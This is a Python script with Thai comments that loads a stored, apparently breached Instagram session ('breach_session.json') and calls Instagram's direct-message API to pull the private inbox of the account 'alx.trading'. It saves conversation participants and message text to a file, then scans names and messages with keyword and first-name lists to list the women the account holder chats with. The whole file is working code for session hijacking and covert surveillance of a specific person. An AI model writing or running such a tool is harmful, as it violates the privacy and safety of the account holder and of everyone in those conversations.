#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ดึงข้อมูลแชทจริงจาก Instagram API โดยใช้ session ที่มีอยู่
Extract real chat data from Instagram API using existing session
"""

import requests
import json
import time
from datetime import datetime

def load_session():
    """โหลด session ที่มีอยู่"""
    session_files = ['session.json', 'breach_session.json']
    
    for session_file in session_files:
        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)
                print(f"✅ โหลด session จาก {session_file}")
                return session_data
        except:
            continue
    
    print("❌ ไม่พบ session file")
    return None

def get_real_chat_data(session_data):
    """ดึงข้อมูลแชทจริงจาก Instagram"""
    
    if not session_data:
        print("❌ ไม่มี session data")
        return None
    
    # สร้าง session
    session = requests.Session()
    
    # ตั้งค่า headers
    headers = {
        'User-Agent': 'Instagram 219.0.0.12.117 Android',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRFToken': session_data.get('csrftoken', ''),
        'X-Instagram-AJAX': '1',
    }
    
    # ตั้งค่า cookies
    if 'cookies' in session_data:
        for cookie in session_data['cookies']:
            session.cookies.set(cookie['name'], cookie['value'])
    
    session.headers.update(headers)
    
    print("🔍 กำลังดึงข้อมูลแชทจริง...")
    
    # API endpoints สำหรับแชท
    endpoints = [
        'https://www.instagram.com/api/v1/direct_v2/inbox/',
        'https://www.instagram.com/api/v1/direct_v2/threads/',
        'https://i.instagram.com/api/v1/direct_v2/inbox/',
    ]
    
    real_chat_data = {
        'conversations': [],
        'messages': [],
        'extraction_time': datetime.now().isoformat(),
        'status': 'unknown'
    }
    
    for endpoint in endpoints:
        try:
            print(f"📡 ลองเข้าถึง: {endpoint}")
            
            response = session.get(endpoint, timeout=30)
            print(f"📊 Status Code: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    print("✅ ได้ข้อมูล JSON!")
                    
                    # ตรวจสอบ structure ของข้อมูล
                    if 'inbox' in data:
                        inbox = data['inbox']
                        threads = inbox.get('threads', [])
                        
                        print(f"💬 พบการสนทนา: {len(threads)} รายการ")
                        
                        for thread in threads[:10]:  # เอาแค่ 10 รายการแรก
                            thread_info = {
                                'thread_id': thread.get('thread_id'),
                                'thread_title': thread.get('thread_title', 'No title'),
                                'users': [],
                                'last_activity': thread.get('last_activity_at'),
                                'message_count': len(thread.get('items', []))
                            }
                            
                            # ดึงข้อมูลผู้ใช้
                            for user in thread.get('users', []):
                                user_info = {
                                    'username': user.get('username'),
                                    'full_name': user.get('full_name'),
                                    'is_verified': user.get('is_verified', False),
                                    'profile_pic_url': user.get('profile_pic_url', '')
                                }
                                thread_info['users'].append(user_info)
                            
                            # ดึงข้อความล่าสุด
                            items = thread.get('items', [])
                            for item in items[:5]:  # เอาแค่ 5 ข้อความล่าสุด
                                if item.get('item_type') == 'text':
                                    message = {
                                        'thread_id': thread.get('thread_id'),
                                        'user_id': item.get('user_id'),
                                        'text': item.get('text', ''),
                                        'timestamp': item.get('timestamp'),
                                        'item_type': item.get('item_type')
                                    }
                                    real_chat_data['messages'].append(message)
                            
                            real_chat_data['conversations'].append(thread_info)
                        
                        real_chat_data['status'] = 'success'
                        break
                        
                    elif 'threads' in data:
                        threads = data['threads']
                        print(f"💬 พบการสนทนา: {len(threads)} รายการ")
                        real_chat_data['status'] = 'partial_success'
                        
                    else:
                        print("🔍 ข้อมูลไม่ตรงกับ format ที่คาดหวัง")
                        print("📋 Keys ที่พบ:", list(data.keys())[:10])
                        
                except json.JSONDecodeError:
                    print("❌ ไม่สามารถ decode JSON")
                    print("📄 Response text:", response.text[:500])
                    
            elif response.status_code == 403:
                print("❌ ถูกปฏิเสธการเข้าถึง (403)")
                
            elif response.status_code == 401:
                print("❌ Session หมดอายุ (401)")
                
            else:
                print(f"❌ Error: {response.status_code}")
                print("📄 Response:", response.text[:200])
            
            time.sleep(2)  # หน่วงเวลาระหว่าง request
            
        except Exception as e:
            print(f"❌ เกิดข้อผิดพลาด: {str(e)}")
            continue
    
    return real_chat_data

def save_real_chat_data(chat_data):
    """บันทึกข้อมูลแชทจริง"""
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"real_chat_data_alx.trading_{timestamp}.json"
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(chat_data, f, ensure_ascii=False, indent=2)
    
    print(f"💾 บันทึกข้อมูลแชทจริงใน: {filename}")
    return filename

def analyze_real_women_contacts(chat_data):
    """วิเคราะห์ผู้หญิงจากข้อมูลแชทจริง"""
    
    print("\n🔍 วิเคราะห์ผู้หญิงจากข้อมูลแชทจริง...")
    print("=" * 60)
    
    women_contacts = []
    female_indicators = [
        'girl', 'woman', 'female', 'lady', 'miss', 'mrs', 'ms',
        'beauty', 'cute', 'pretty', 'beautiful', 'gorgeous', 'lovely',
        'queen', 'princess', 'babe', 'baby', 'honey', 'darling', 'sweetheart'
    ]
    
    conversations = chat_data.get('conversations', [])
    
    print(f"💬 จำนวนการสนทนาทั้งหมด: {len(conversations)}")
    
    for conv in conversations:
        users = conv.get('users', [])
        
        for user in users:
            username = user.get('username', '').lower()
            full_name = user.get('full_name', '').lower()
            
            # ตรวจสอบว่าเป็นผู้หญิงหรือไม่
            is_female = False
            
            # ตรวจสอบจาก username
            for indicator in female_indicators:
                if indicator in username or indicator in full_name:
                    is_female = True
                    break
            
            # ตรวจสอบจากชื่อที่เป็นผู้หญิง
            common_female_names = [
                'anna', 'maria', 'sarah', 'jessica', 'jennifer', 'amy', 'lisa',
                'michelle', 'kimberly', 'donna', 'nancy', 'karen', 'betty',
                'helen', 'sandra', 'deborah', 'rachel', 'carolyn', 'janet',
                'virginia', 'maria', 'heather', 'diane', 'ruth', 'julie'
            ]
            
            for name in common_female_names:
                if name in username or name in full_name:
                    is_female = True
                    break
            
            if is_female:
                women_contacts.append({
                    'username': user.get('username'),
                    'full_name': user.get('full_name'),
                    'is_verified': user.get('is_verified'),
                    'thread_id': conv.get('thread_id'),
                    'last_activity': conv.get('last_activity'),
                    'message_count': conv.get('message_count')
                })
    
    # ดูข้อความที่เกี่ยวข้องกับผู้หญิง
    messages = chat_data.get('messages', [])
    female_related_messages = []
    
    for msg in messages:
        text = msg.get('text', '').lower()
        
        for indicator in female_indicators:
            if indicator in text:
                female_related_messages.append(msg)
                break
    
    print(f"👥 ผู้หญิงที่พบ: {len(women_contacts)} คน")
    print(f"💬 ข้อความที่เกี่ยวข้องกับผู้หญิง: {len(female_related_messages)} ข้อความ")
    
    if women_contacts:
        print("\n👩 รายชื่อผู้หญิง:")
        for i, woman in enumerate(women_contacts[:10], 1):
            print(f"   {i}. {woman['username']} ({woman['full_name']})")
            print(f"      Messages: {woman['message_count']}")
    
    if female_related_messages:
        print("\n💬 ตัวอย่างข้อความ:")
        for i, msg in enumerate(female_related_messages[:5], 1):
            text = msg['text'][:50] + '...' if len(msg['text']) > 50 else msg['text']
            print(f"   {i}. {text}")
    
    return women_contacts, female_related_messages

def main():
    print("🚀 ดึงข้อมูลแชทจริงของ alx.trading")
    print("Extracting real chat data for alx.trading")
    print("=" * 60)
    
    # โหลด session
    session_data = load_session()
    if not session_data:
        print("❌ ไม่สามารถโหลด session ได้")
        return
    
    # ดึงข้อมูลแชทจริง
    real_chat_data = get_real_chat_data(session_data)
    
    if real_chat_data and real_chat_data['status'] in ['success', 'partial_success']:
        # บันทึกข้อมูล
        filename = save_real_chat_data(real_chat_data)
        
        # วิเคราะห์ผู้หญิง
        women_contacts, female_messages = analyze_real_women_contacts(real_chat_data)
        
        print(f"\n✅ สำเร็จ! ดึงข้อมูลแชทจริงได้แล้ว")
        print(f"📄 ไฟล์: {filename}")
        print(f"💬 การสนทนา: {len(real_chat_data.get('conversations', []))}")
        print(f"📝 ข้อความ: {len(real_chat_data.get('messages', []))}")
        print(f"👩 ผู้หญิงที่พบ: {len(women_contacts)}")
        
        if len(women_contacts) > 0:
            print(f"\n🔴 พบผู้หญิงที่ alx.trading คุยด้วย!")
        else:
            print(f"\n🟡 ไม่พบผู้หญิงในข้อมูลแชทนี้")
            
    else:
        print("❌ ไม่สามารถดึงข้อมูลแชทจริงได้")
        print("💡 ลองตรวจสอบ session หรือใช้วิธีอื่น")

if __name__ == "__main__":
    main()
